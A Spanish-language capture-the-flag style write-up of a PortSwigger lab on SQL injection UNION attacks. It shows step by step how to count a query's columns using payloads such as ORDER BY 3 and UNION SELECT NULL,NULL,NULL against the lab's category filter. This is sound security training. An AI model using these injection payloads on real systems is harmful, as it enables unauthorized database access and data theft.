# Lab: SQL injection UNION attack, determining the number of columns returned by the query

- [Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a `SQL injection UNION` attack that returns an additional row containing null values.

---

### Explicación:

Si solo se pone una comilla da error, ya que el query se quedaría con una sola comilla, es decir, **Se encuentra un error!!!**

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a46c0863-5d12-4127-9887-7d5d1ecd7a1f)

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a79c49df-b0d6-47f3-90b8-0c0c9f0e8b1b)

Ahora hay que buscar la manera de Fuzzear y contar.

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/a91df05f-15d9-4d60-a5c0-dc72550d5486)

Esto se vería algo así:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/0af7cb7d-db50-4ae9-8462-f7cb35c71ac2)

OJO! port swigger no acepta numeros por eso marca error:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/bb3ee3ea-2a12-4443-ae86-867df5e71359)

PAra hacerlo funcionar se necesita poner NULL

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/419b752f-d2a3-4e30-9772-cb9c1bfd548a)

Aunque en este caso no se ven los números en la pantalla, en realidad si pasa el laboratorio, esto debido al `NULL` y podemos saber que tenemos 3 columnas (eso pedía el lab después de todo)

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/1c622ff2-4f1a-4e56-b3ff-42ab65c4887e)

Super ojito! También se pueden ingresar comandos ALV

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/d4b6d7e9-95c3-4132-bb31-5a806ce9f877)

A eso se le llama SQLi RC

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/64a6367d-2cf8-4a45-9a75-eae6cf429776)

## Solución:

1. En este caso la vulnerabilidad también está en categorías

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/8a87141b-dded-420f-b75f-05439d0def77)

2. Aquí encuentro el error

3.  Salgo adelante del error y hago el conteo de columnas

````
https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle' ORDER BY 3 -- -
````

4. Acomodo las columnas

````
https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  Union Select 1,2,3 -- -
````

Utilizo NULL en lugar de números

````
https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  UNION SELECT NULL,NULL,NULL -- -
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/600fb155-e0c3-437c-96f9-e04ba315f31f)

Para Fuzzear lso numeros se debe poner algún string o algo entre cada NULL, en este caso el segundo NULL es el vulnerable

````
https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  UNION SELECT NULL,'Fz3r0',NULL -- -
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/db8636b9-9c7d-4710-beeb-fd430198cf84)

Ahora si puedo inyectar querys visibles en ese campo

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/64c795c2-687a-423e-b58e-5f69cca10a2d)







Es prácticamente el ejercicio anterior, pero en el anterior puse Fz3r0 y ahora piden un string en paricular:

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/183aaf72-8873-40bb-bc09-07ea29316f6c)
